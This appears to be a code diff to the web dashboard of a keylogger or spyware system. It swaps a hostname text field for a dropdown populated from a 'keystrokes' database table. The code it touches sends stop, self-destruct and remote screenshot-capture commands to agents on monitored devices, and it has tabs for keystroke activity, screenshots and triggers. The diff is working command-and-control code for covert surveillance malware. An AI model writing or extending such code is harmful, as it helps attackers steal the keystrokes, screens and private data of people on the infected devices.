@@ -62,8 +62,9 @@
     <section class="flex flex-wrap items-center justify-between gap-4 bg-slate-900/50 border border-slate-800 p-4 rounded-xl">
       <div class="flex flex-wrap items-center gap-3">
         <div class="relative">
-          <input type="text" id="hostnameInput" placeholder="Filter by device hostname..."
-                 class="w-64 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-300 placeholder-slate-500 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
+          <select id="hostnameInput" class="w-64 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-300 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
+            <option value="" disabled selected>Select a device...</option>
+          </select>
         </div>
         <button class="inline-flex items-center justify-center px-4 py-2 text-sm font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-lg transition" onclick="fetchKeys(true)">Refresh</button>
         <label class="inline-flex items-center cursor-pointer ml-2">
@@ -232,6 +233,26 @@ function removeAlias(real) {
   fetchKeys();
 }
 
+async function populateHostnames() {
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/keystrokes?select=hostname&distinct=true&order=hostname.asc'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const sel = document.getElementById('hostnameInput');
+    const current = sel.value;
+    sel.innerHTML = '<option value="" disabled>Select a device...</option>';
+    if (data && data.length > 0) {
+      data.forEach(r => {
+        const opt = document.createElement('option');
+        opt.value = r.hostname;
+        opt.textContent = r.hostname;
+        sel.appendChild(opt);
+      });
+    }
+    if (current) sel.value = current;
+  } catch (e) {}
+}
+
 function escapeHtml(s) {
   if (!s) return '';
   return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
@@ -309,7 +330,7 @@ function goToPage(page) {
 async function sendStop() {
   const btn = document.getElementById('stopBtn');
   const hostname = document.getElementById('hostnameInput').value.trim();
-  if (!hostname) { showToast('Enter the hostname of the device', 'error'); return; }
+  if (!hostname) { showToast('Select a device first', 'error'); return; }
   btn.disabled = true; btn.textContent = 'Sending...';
   try {
     const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
@@ -326,7 +347,7 @@ async function sendStop() {
 async function sendDestruct() {
   const btn = document.getElementById('destructBtn');
   const hostname = document.getElementById('hostnameInput').value.trim();
-  if (!hostname) { showToast('Enter the hostname of the device', 'error'); return; }
+  if (!hostname) { showToast('Select a device first', 'error'); return; }
   if (!confirm('Permanently kill the agent on "' + hostname + '"?')) return;
   btn.disabled = true; btn.textContent = 'Sending...';
   try {
@@ -425,7 +446,7 @@ async function fetchScreenshots() {
 async function sendCapture() {
   const btn = document.getElementById('captureBtn');
   const hostname = document.getElementById('hostnameInput').value.trim();
-  if (!hostname) { showToast('Enter the hostname of the device', 'error'); return; }
+  if (!hostname) { showToast('Select a device first', 'error'); return; }
   btn.disabled = true; btn.textContent = 'Requesting...';
   try {
     const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
@@ -442,18 +463,17 @@ async function sendCapture() {
 document.getElementById('stopBtn').addEventListener('click', sendStop);
 document.getElementById('destructBtn').addEventListener('click', sendDestruct);
 
-document.getElementById('hostnameInput').addEventListener('keydown', (e) => {
-  if (e.key === 'Enter') fetchKeys(true);
-});
+document.getElementById('hostnameInput').addEventListener('change', () => fetchKeys(true));
 
 document.getElementById('triggerInput').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') addTrigger();
 });
 
 window.addEventListener('DOMContentLoaded', () => {
+  populateHostnames();
   fetchKeys(true);
   refreshInterval = setInterval(() => {
-    if (currentTab === 'activity') fetchKeys();
+    if (currentTab === 'activity') { fetchKeys(); populateHostnames(); }
     else if (currentTab === 'screenshots') fetchScreenshots();
     else if (currentTab === 'triggers') fetchTriggers();
   }, 20000);
